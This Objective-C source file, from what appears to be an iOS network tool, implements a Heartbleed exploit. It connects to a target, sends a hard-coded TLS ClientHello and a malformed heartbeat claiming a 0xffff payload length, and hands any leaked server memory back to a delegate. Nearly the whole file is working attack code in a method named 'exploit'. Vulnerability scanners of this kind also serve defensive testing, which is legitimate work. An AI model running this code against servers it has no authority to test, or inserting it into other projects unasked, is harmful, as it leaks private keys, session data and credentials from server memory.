//
//  IJTHeartbleed.m
//  IJTHeartbleed
//
//  Created by 聲華 陳 on 2015/12/19.
//
//

#import "IJTHeartbleed.h"
#import <openssl/err.h>
#import <openssl/ssl.h>
#import <openssl/pkcs12.h>
#import <openssl/x509.h>
#import <openssl/x509v3.h>
#import <openssl/ocsp.h>
#import <unistd.h>
#import <sys/ioctl.h>
#import <sys/sysctl.h>
#import <arpa/inet.h>
#import <netdb.h>
#import <sys/socket.h>
#import <sys/select.h>
#import <string.h>

@interface IJTHeartbleed ()

@property (nonatomic) struct sockaddr_in sin4;
@property (nonatomic) struct sockaddr_in6 sin6;
@property (nonatomic) sa_family_t family;
@property (nonatomic) struct timeval timeout;
@property (nonatomic) BOOL stopAll;

@end

@implementation IJTHeartbleed

- (id)init {
    self = [super init];
    if(self) {
        SSL_library_init();
        SSLeay_add_all_algorithms();
        ERR_load_crypto_strings();
    }
    return self;
}

- (int)setTarget: (NSString *)target port: (u_int16_t)port family: (sa_family_t)family timeout: (u_int32_t)timeout {
    int socketDescriptor = 0;
    struct hostent *hp;
    _family = family;
    
    if(family == AF_INET) {
        memset(&_sin4, 0, sizeof(_sin4));
        _sin4.sin_family = AF_INET;
        _sin4.sin_len = sizeof(_sin4);
        _sin4.sin_port = htons(port);
        
        if(inet_pton(AF_INET, [target UTF8String], &_sin4.sin_addr) != 1) {
            hp = gethostbyname2([target UTF8String], AF_INET);
            if (!hp) {
                [self.delegate IJTHeartbleedResolveHostnameFailure:[NSString stringWithUTF8String:hstrerror(h_errno)]];
                return -1;
            }
            if ((unsigned)hp->h_length > sizeof(_sin4.sin_addr)) {
                [self.delegate IJTHeartbleedResolveHostnameFailure:[NSString stringWithUTF8String:hstrerror(h_errno)]];
                return -1;
            }
            
            memcpy(&_sin4.sin_addr, hp->h_addr_list[0], sizeof _sin4.sin_addr);
            //(void)strncpy(hnamebuf, hp->h_name, sizeof(hnamebuf) - 1);
            //hnamebuf[sizeof(hnamebuf) - 1] = '\0';
        }
    }//end if
    else if(family == AF_INET6) {
        memset(&_sin6, 0, sizeof(_sin6));
        _sin6.sin6_family = AF_INET6;
        _sin6.sin6_len = sizeof(_sin6);
        _sin6.sin6_port = htons(port);
        
        if(inet_pton(AF_INET6, [target UTF8String], &_sin6.sin6_addr) != 1) {
            hp = gethostbyname2([target UTF8String], AF_INET6);
            if (!hp) {
                [self.delegate IJTHeartbleedResolveHostnameFailure:[NSString stringWithUTF8String:hstrerror(h_errno)]];
                return -1;
            }
            if ((unsigned)hp->h_length > sizeof(_sin6.sin6_addr)) {
                [self.delegate IJTHeartbleedResolveHostnameFailure:[NSString stringWithUTF8String:hstrerror(h_errno)]];
                return -1;
            }
            
            memcpy(&_sin6.sin6_addr, hp->h_addr_list[0], sizeof _sin6.sin6_addr);
        }
    }//end else
    
    _timeout.tv_sec = timeout / 1000;
    _timeout.tv_usec = timeout % 1000;
    
    socketDescriptor = [self tcpConnect];
    if(socketDescriptor < 0) {
        return -1;
    }
    else {
        close(socketDescriptor);
    }
    return 0;
}

- (void)stop {
    _stopAll = YES;
}

- (int)exploit {
    
    if(_stopAll)
        return -1;
    
    _stopAll = NO;
    
    //heartbleed
    int
    status = [self testHeartbleed:(SSL_METHOD *)TLSv1_2_client_method()]; //tls 1.2
    if(_stopAll)
        return 0;
    if(status != -1)
        status = [self testHeartbleed:(SSL_METHOD *)TLSv1_1_client_method()]; //tls 1.1
    if(_stopAll)
        return 0;
    if(status != -1)
        status = [self testHeartbleed:(SSL_METHOD *)TLSv1_client_method()]; //tls 1.0
    return 0;
}

- (int)testHeartbleed: (SSL_METHOD *)sslMethod {
    // Variables...
    int status = true;
    int socketDescriptor = 0;
    
    // Connect to host
    socketDescriptor = [self tcpConnect];
    
    
    if (socketDescriptor != -1) {
        
        // Credit to Jared Stafford (jspenguin@jspenguin.org)
        char hello[] = {0x16,0x03,0x00,0x00,0xdc,0x01,0x00,0x00,0xd8,0x03,0x02,0x53,0x43,0x5b,0x90,0x9d,0x9b,0x72,0x0b,0xbc,0x0c,0xbc,0x2b,0x92,0xa8,0x48,0x97,0xcf,0xbd,0x39,0x04,0xcc,0x16,0x0a,0x85,0x03,0x90,0x9f,0x77,0x04,0x33,0xd4,0xde,0x00,0x00,0x66,0xc0,0x14,0xc0,0x0a,0xc0,0x22,0xc0,0x21,0x00,0x39,0x00,0x38,0x00,0x88,0x00,0x87,0xc0,0x0f,0xc0,0x05,0x00,0x35,0x00,0x84,0xc0,0x12,0xc0,0x08,0xc0,0x1c,0xc0,0x1b,0x00,0x16,0x00,0x13,0xc0,0x0d,0xc0,0x03,0x00,0x0a,0xc0,0x13,0xc0,0x09,0xc0,0x1f,0xc0,0x1e,0x00,0x33,0x00,0x32,0x00,0x9a,0x00,0x99,0x00,0x45,0x00,0x44,0xc0,0x0e,0xc0,0x04,0x00,0x2f,0x00,0x96,0x00,0x41,0xc0,0x11,0xc0,0x07,0xc0,0x0c,0xc0,0x02,0x00,0x05,0x00,0x04,0x00,0x15,0x00,0x12,0x00,0x09,0x00,0x14,0x00,0x11,0x00,0x08,0x00,0x06,0x00,0x03,0x00,0xff,0x01,0x00,0x00,0x49,0x00,0x0b,0x00,0x04,0x03,0x00,0x01,0x02,0x00,0x0a,0x00,0x34,0x00,0x32,0x00,0x0e,0x00,0x0d,0x00,0x19,0x00,0x0b,0x00,0x0c,0x00,0x18,0x00,0x09,0x00,0x0a,0x00,0x16,0x00,0x17,0x00,0x08,0x00,0x06,0x00,0x07,0x00,0x14,0x00,0x15,0x00,0x04,0x00,0x05,0x00,0x12,0x00,0x13,0x00,0x01,0x00,0x02,0x00,0x03,0x00,0x0f,0x00,0x10,0x00,0x11,0x00,0x23,0x00,0x00,0x00,0x0f,0x00,0x01,0x01};
        
        if (sslMethod == TLSv1_client_method()) {
            hello[2] = 0x01;
        }
#if OPENSSL_VERSION_NUMBER >= 0x10001000L
        else if (sslMethod == TLSv1_1_client_method()) {
            hello[2] = 0x02;
        }
        else if (sslMethod == TLSv1_2_client_method()) {
            hello[2] = 0x03;
        }
#endif
        if (send(socketDescriptor, hello, sizeof(hello), 0) <= 0) {
            [self.delegate IJTHeartbleedTestHeartbleedFailure:[NSString stringWithUTF8String:strerror(errno)]];
            close(socketDescriptor);
            return -1;
        }
        
        // Send the heartbeat
        char hb[8] = {0x18, 0x03, 0x00, 0x00, 0x03, 0x01, 0xff, 0xff};
        
        if (sslMethod == TLSv1_client_method()) {
            hb[2] = 0x01;
        }
#if OPENSSL_VERSION_NUMBER >= 0x10001000L
        else if (sslMethod == TLSv1_1_client_method()) {
            hb[2] = 0x02;
        }
        else if (sslMethod == TLSv1_2_client_method()) {
            hb[2] = 0x03;
        }
#endif
        if (send(socketDescriptor, hb, sizeof(hb), 0) <= 0) {
            [self.delegate IJTHeartbleedTestHeartbleedFailure:[NSString stringWithUTF8String:strerror(errno)]];
            close(socketDescriptor);
            return -1;
        }
        
        char hbbuf[65536];
        
        while(1) {
            memset(hbbuf, 0, sizeof(hbbuf));
            
            // Read 5 byte header
            int readResult = (int)recv(socketDescriptor, hbbuf, 5, 0);
            if (readResult <= 0) {
                break;
            }
            
            char typ = hbbuf[0];
            
            // Combine 2 bytes to get payload length
            uint16_t ln = hbbuf[4] | hbbuf[3] << 8; //just like ntohs
            
            memset(hbbuf, 0, sizeof(hbbuf));
            
            // Read rest of record
            readResult = (int)recv(socketDescriptor, hbbuf, ln, 0);
            if (readResult <= 0) {
                break;
            }
            
            // Server returned error
            if (typ == 21) {
                break;
            }
            // Successful response
            else if (typ == 24 && ln > 3) {
                [self.delegate IJTHeartbleedTestHeartbleedResultVersion:[NSString stringWithUTF8String:printableSslMethod(sslMethod)] vulnerable:YES data:hbbuf length:ln];
                close(socketDescriptor);
                return 0;
            }
        }
        [self.delegate IJTHeartbleedTestHeartbleedResultVersion:[NSString stringWithUTF8String:printableSslMethod(sslMethod)] vulnerable:NO data:NULL length:0];
        
        // Disconnect from host
        close(socketDescriptor);
    }
    else {
        // Could not connect
        return -1;
    }
    
    return status;
}

static const char* printableSslMethod(const SSL_METHOD *sslMethod) {
#ifndef OPENSSL_NO_SSL2
    if (sslMethod == SSLv2_client_method())
        return "SSLv2";
#endif
#ifndef OPENSSL_NO_SSL3
    if (sslMethod == SSLv3_client_method())
        return "SSLv3";
#endif
    if (sslMethod == TLSv1_client_method())
        return "TLSv1.0";
#if OPENSSL_VERSION_NUMBER >= 0x10001000L
    if (sslMethod == TLSv1_1_client_method())
        return "TLSv1.1";
    if (sslMethod == TLSv1_2_client_method())
        return "TLSv1.2";
#endif
    return "unknown SSL_METHOD";
}

/**
 * 開啟tcp connect
 */
- (int)tcpConnect {
    // Variables...
    int socketDescriptor;
    int n = 1;
    
    // Create Socket
    socketDescriptor = socket(_family, SOCK_STREAM, IPPROTO_TCP);
    
    if(socketDescriptor < 0) {
        [self.delegate IJTHeartbleedCreateSocketFailure:[NSString stringWithUTF8String:strerror(errno)]];
        return -1;
    }
    
    setsockopt(socketDescriptor, SOL_SOCKET, SO_RCVTIMEO, (char *)&_timeout, sizeof(struct timeval));
    setsockopt(socketDescriptor, SOL_SOCKET, SO_SNDTIMEO, (char *)&_timeout, sizeof(struct timeval));
    setsockopt(socketDescriptor, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(n));
    
    int oldFlags = fcntl(socketDescriptor, F_GETFL, NULL);
    if(oldFlags < 0) {
        [self.delegate IJTHeartbleedCreateSocketFailure:[NSString stringWithUTF8String:strerror(errno)]];
        close(socketDescriptor);
        return -1;
    }//end if
    oldFlags |= O_NONBLOCK;
    if(fcntl(socketDescriptor, F_SETFL, oldFlags) < 0) {
        [self.delegate IJTHeartbleedCreateSocketFailure:[NSString stringWithUTF8String:strerror(errno)]];
        close(socketDescriptor);
        return -1;
    }//end if
    
    // Connect
    if (_family == AF_INET) {
        connect(socketDescriptor, (struct sockaddr *)&_sin4, sizeof(_sin4));
    }
    else {    // IPv6
        connect(socketDescriptor, (struct sockaddr *)&_sin6, sizeof(_sin6));
    }
    
    while(1) {
        fd_set fd;
        struct timespec tv = {};
        int n = 0;
        
        FD_ZERO(&fd);
        FD_SET(socketDescriptor, &fd);
        tv.tv_sec = _timeout.tv_sec;
        tv.tv_nsec = _timeout.tv_usec * 1000;
        
        if ((n = pselect(socketDescriptor + 1, NULL, &fd, NULL, &tv, NULL)) < 0) {
            [self.delegate IJTHeartbleedCreateSocketFailure:[NSString stringWithUTF8String:strerror(errno)]];
            close(socketDescriptor);
            return -1;
        }
        if(n == 0) {
            [self.delegate IJTHeartbleedConnectTimeout];
            close(socketDescriptor);
            return -1;
        }//end if timeout
        if(!FD_ISSET(socketDescriptor, &fd))
            continue;
        
        //connected
        //disable block
        int oldFlags = fcntl(socketDescriptor, F_GETFL, NULL);
        if(oldFlags < 0) {
            [self.delegate IJTHeartbleedCreateSocketFailure:[NSString stringWithUTF8String:strerror(errno)]];
            close(socketDescriptor);
            return -1;
        }
        oldFlags &= ~O_NONBLOCK;
        if(fcntl(socketDescriptor, F_SETFL, oldFlags) < 0) {
            [self.delegate IJTHeartbleedCreateSocketFailure:[NSString stringWithUTF8String:strerror(errno)]];
            close(socketDescriptor);
            return -1;
        }
        
        int val;
        int len = sizeof(val);
        getsockopt(socketDescriptor, SOL_SOCKET, SO_ERROR, (void *)&val, (socklen_t *)&len);
        
        if(val == 0) {
            return socketDescriptor;
        }
        else {
            errno = val;
            [self.delegate IJTHeartbleedCreateSocketFailure:[NSString stringWithUTF8String:strerror(errno)]];
            close(socketDescriptor);
            return -1;
        }
        
        break;
    }//end while
}
@end
